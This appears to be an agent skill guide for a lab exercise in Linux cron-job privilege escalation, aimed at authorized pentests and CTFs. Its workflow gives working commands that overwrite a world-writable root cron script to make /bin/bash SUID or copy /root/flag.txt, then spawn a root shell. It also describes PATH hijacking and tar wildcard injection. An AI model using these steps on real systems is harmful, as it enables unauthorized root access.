---
name: analyzing-cron-job-privesc-vectors
description: >-
  Identify and exploit Linux cron job misconfigurations to escalate privileges
  from a low-privilege user to root. Covers writable cron scripts, world-writable
  PATH entries, wildcard injection, and cron-based reverse shells in isolated
  lab environments.
domain: cybersecurity
subdomain: privilege-escalation
tags: [cron, privesc, linux, privilege-escalation, post-exploitation, intermediate]
difficulty: intermediate
version: "1.0.0"
author: RashpreetS01
license: Apache-2.0
mitre_techniques:
  - T1053.003
---

> **Educational Use Only** — All techniques described here must only be used in authorized, isolated lab environments. Never use against systems you do not own or have explicit written permission to test.

## When to Use

Use this skill after gaining initial shell access to a Linux system during an authorized penetration test, when looking for local privilege escalation paths. It is particularly relevant when the target runs automated maintenance or backup scripts as root and those scripts are not properly locked down. It applies in CTF challenges where the escalation path from a low-privilege foothold to root involves a scheduled task.

## Prerequisites

- An established low-privilege shell on the target Linux system (or the lab environment)
- Basic Linux file permissions knowledge (`chmod`, `chown`, `ls -la`)
- Understanding of cron syntax (`* * * * *` minute/hour/day/month/weekday)
- Lab: `labs/linux/cron-privesc` — start with `agentlab start cron-privesc`

## Workflow

### Step 1: Start the Lab Environment

Launch the lab with a pre-configured low-privilege user (`www-data`) and a root-owned cron job running a misconfigured script every minute.

```bash
agentlab start cron-privesc
# SSH to victim: ssh lowpriv@172.40.0.10 (password: lowpriv)
# Or: agentlab exec cron-privesc bash --as www-data
```

### Step 2: Enumerate Running and Scheduled Cron Jobs

Systematically check all locations where cron jobs can be defined.

```bash
# System-wide crontab
cat /etc/crontab

# Cron directories
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/
cat /etc/cron.d/*

# Per-user crontabs (readable if you are that user)
crontab -l

# Check for running cron-related processes
ps aux | grep -E "cron|CRON"
```

### Step 3: Identify Misconfigured Scripts

Look for scripts called by root cron jobs that are writable by the current user.

```bash
# Find world-writable scripts referenced in crontab
ls -la /opt/maintenance/backup.sh
# Expected vulnerable output: -rwxrwxrwx 1 root root ... /opt/maintenance/backup.sh

# Check PATH entries in /etc/crontab for writable directories
echo $PATH
grep "^PATH" /etc/crontab
# If PATH=/usr/local/bin:/usr/bin and /usr/local/bin is writable — drop a binary there
ls -la /usr/local/bin/
```

### Step 4: Exploit the Misconfiguration

Overwrite the writable cron script to execute a payload as root. The most reliable payload in a CTF context writes the flag or adds a SUID shell.

```bash
# Option A: Make bash SUID (persistent root shell)
echo '#!/bin/bash' > /opt/maintenance/backup.sh
echo 'chmod u+s /bin/bash' >> /opt/maintenance/backup.sh

# Option B: Copy flag to readable location
echo '#!/bin/bash' > /opt/maintenance/backup.sh
echo 'cat /root/flag.txt > /tmp/flag.txt && chmod 644 /tmp/flag.txt' >> /opt/maintenance/backup.sh

# Ensure script remains executable
chmod +x /opt/maintenance/backup.sh
```

### Step 5: Wait for Cron Execution and Verify Results

Wait up to 60 seconds for the root cron job to execute the modified script, then confirm privilege escalation.

```bash
# Watch for SUID bit to appear on /bin/bash
watch -n 5 ls -la /bin/bash

# Once SUID is set, spawn root shell
/bin/bash -p
whoami  # Should print: root

# Or read the flag copied to /tmp
cat /tmp/flag.txt
agentlab verify cron-privesc "FLAG{...}"
```

## Key Concepts

- **Cron Privilege Escalation**: Exploiting scheduled tasks that run as a privileged user (root) but reference scripts or binaries that unprivileged users can modify.
- **Writable Script Injection**: If a root cron job executes a script whose file permissions allow write access by the attacker, the attacker can replace its contents with arbitrary commands.
- **PATH Hijacking**: If a cron job calls a command without an absolute path and the cron `PATH` includes a directory writable by the attacker, a malicious binary with the same name takes precedence.
- **Wildcard Injection**: Some cron scripts use shell wildcards (`tar cf backup *`) — an attacker can create filenames that are interpreted as command-line flags, injecting options like `--checkpoint-action=exec=sh`.
- **SUID Bash**: Setting the SUID bit on `/bin/bash` allows any user to spawn a root shell with `bash -p`, a common CTF persistence mechanism.

## Tools

| Tool | Purpose | Install |
|------|---------|---------|
| `pspy` | Monitor processes and cron jobs without root privileges | `wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64` |
| `LinPEAS` | Automated Linux privilege escalation enumeration script | `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh` |
| `crontab` | View and edit cron jobs for the current user | Built-in |
| `watch` | Repeatedly run a command to detect filesystem changes | `apt install procps` |

## Output

On success, you should observe:
- A cron job entry visible in `/etc/crontab` or `/etc/cron.d/` calling a world-writable script
- The SUID bit set on `/bin/bash` after the cron job fires, confirmed with `ls -la /bin/bash`
- A root shell obtained via `/bin/bash -p` with `whoami` returning `root`
- Flag captured in the format `FLAG{...}`

---

*All labs referenced in this skill run in isolated Docker environments with `internal: true` networks. No internet access. Educational use in authorized environments only.*
